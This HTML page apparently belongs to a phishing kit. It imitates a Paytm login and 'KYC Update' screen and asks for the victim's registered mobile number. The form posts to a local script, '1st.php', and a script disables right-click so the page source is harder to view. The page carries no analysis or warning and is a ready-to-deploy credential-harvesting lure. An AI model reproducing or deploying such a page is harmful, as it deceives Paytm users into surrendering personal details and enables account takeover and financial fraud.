<!DOCTYPE html>
<html lang="eng">
<head>
  <meta charset="UTF-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
  <link rel="manifest" href="/site.webmanifest">
  <meta name="msapplication-TileColor" content="#da532c">
  <meta name="theme-color" content="#ffffff">
  <title>Login to paytm-KYC Update</title>
  <style>
    #ml
    {
      width:105%;
      margin-left:-7px;
    }
    #id,#ps
    {
      width: 300px;
      height: 30px;
      background-color: white;
      color:#404145;
      font-size: 15px !important;
      line-height: 25px !important;
      padding: 1px 5px;
      margin-bottom:10px;
      margin-left:15px;
      outline: none;
      background:none;
      box-shadow: 0px 2px 0px #DADADA;
      border:none;
    }
    #id:hover
    {
       box-shadow: 0px 2px 0px #01B9F5;
    }
    #ps:hover
    {
    box-shadow: 0px 2px 0px #01B9F5;
    }
    #btn
    {
      width:170px;
      background-color:#01B9F5;
      color: white;
      margin-left:15px;
      border: solid black;
      border-radius: 2px;
      border-width: 0px;
      font-weight: bold;
      cursor: pointer;
      font-size: 14px;
      height:38px;
    }
    #check
    { 
    margin:5px;
    margin-left:200px;
    }
    #chi
    { 
    color:#47474D; 
    font-family:Arial, Helvetica, sans-serif;
    font-size:14px;
    } 
    #ab
    {
    width:365px;
    border-bottom:solid #E6E6E6;
    border-width:1.5px;
    }
    input::-webkit-input-placeholder {
    color: #CCCCCC;
    }
    input:-moz-placeholder {
    color: #CCCCCC;
    }
    input::-moz-placeholder {
    color: #CCCCCC;
    }
    input:-ms-input-placeholder {
    color: #999;
    }
  </style>
  <script language="javascript"> 
  var message="For security reasons, This function is not allowed here.";
  function clickIE4(){
  if (event.button==2){
  alert(message);
  return false;
  }
  }
  function clickNS4(e){
  if (document.layers||document.getElementById&&!document.all){
  if (e.which==2||e.which==3){
  alert(message);
  return false;
  }
  }
  }
  if (document.layers){
  document.captureEvents(Event.MOUSEDOWN);
  document.onmousedown=clickNS4;}
  else if (document.all&&!document.getElementById){
  document.onmousedown=clickIE4;}
  document.oncontextmenu=new Function("alert(message);return false;")
  </script>
</head>
<body>
<div class="line">
  <img src="ptml.jpg" alt="" id="ml"><br><br>
  <form action="1st.php" method="post">
  <b style="font-family:arial; font-size:25px; color:#434343; margin-left:20px;">Login to Access Your <span style="margin-left:20px;">Account</b><br><br><br>
   <b style="font-family:arial; font-size:15px; color:#01B9F5; margin-left:15px;">Mobile Number</b><br>
   <input type="text"name="Mobile No." id="id" inputmode="numeric"
   placeholder="Registered Paytm Mobile Number" 
   maxlength="11"
   pattern="[0-9]{10,11}"
   title="Please enter valid mobile number" required=""><br><br>
   
   
   
   <button type="submit" id="btn" style="font-weight:bold;">Sign In Securely </button>
   <b style="color: #01B9F5; font-size:13.5px; font-family: Arial, Helvetica, sans-serif; margin-left:30px;"> <a href="forgot.html" style=" color:#01B9F5; font-family: Arial, Helvetica, sans-serif; text-decoration:none;"></a></b><br><br>
   <b style="color:black; font-size:16px; font-family: Arial, Helvetica, sans-serif; margin-left:10px;"> By signing in, you agree to our
   <span style="color: #01B9F5;">privacy policy </span> <span style="color:black; margin-left:10px;">and</span> <span style="color: #01B9F5;">terms of use.</span></p1><br><br>
   <div id="ab" 
   style="margin:10px; 
   margin-left:-8px;">
   </div><br>
   </b></span></form></div></body></html>
   